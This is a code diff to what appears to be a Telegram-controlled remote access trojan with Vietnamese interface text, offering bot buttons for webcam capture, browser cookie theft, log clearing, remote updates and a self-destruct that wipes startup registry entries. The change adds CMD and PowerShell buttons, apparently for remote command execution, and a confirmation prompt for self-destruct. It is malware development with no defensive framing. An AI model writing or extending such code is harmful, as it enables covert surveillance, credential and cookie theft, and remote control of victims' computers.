@@ -892,19 +892,21 @@ def execute_command(command, message=None):
             "inline_keyboard": [
                 [
                     {"text": "📷 Webcam", "callback_data": f"webcam @{my_name}"},
-                    {"text": "🔍 Cookies", "callback_data": f"browser @{my_name}"}
+                    {"text": "🔍 Cookies", "callback_data": f"browser @{my_name}"},
+                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"}
                 ],
                 [
-                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"},
-                    {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"}
-                ],
-                [
+                    {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"},
                     pause_btn,
                     {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"}
                 ],
                 [
                     {"text": "🔄 Cập nhật", "callback_data": f"update @{my_name}"},
                     {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
+                ],
+                [
+                    {"text": "CMD", "callback_data": f"cmd @{my_name}"},
+                    {"text": "PS", "callback_data": f"ps @{my_name}"}
                 ]
             ]
         }
@@ -1000,8 +1002,17 @@ def execute_command(command, message=None):
         update_state(paused=False)
         send_telegram_message("▶️ Đã tiếp tục hoạt động giám sát.")
 
-    elif cmd in ["/destruct", "destruct", "/selfdestruct", "selfdestruct"]:
-        self_destruct()
+    elif cmd.startswith("/destruct") or cmd.startswith("destruct"):
+        parts = command.strip().split()
+        if len(parts) == 2 and parts[1].upper() == "Y":
+            self_destruct()
+        else:
+            send_telegram_message(
+                f"<b>⚠️ CẢNH BÁO TỰ HỦY [{my_name}]</b>\n\n"
+                f"Hành động này sẽ xóa sạch toàn bộ file chạy, registry khởi động và dữ liệu tạm của thiết bị.\n\n"
+                f"Để xác nhận tự hủy, vui lòng gõ đúng cú pháp:\n"
+                f"<code>/destruct Y @{my_name.lower()}</code>"
+            )
     
     elif cmd in ["/help", "help"]:
         help_text = (
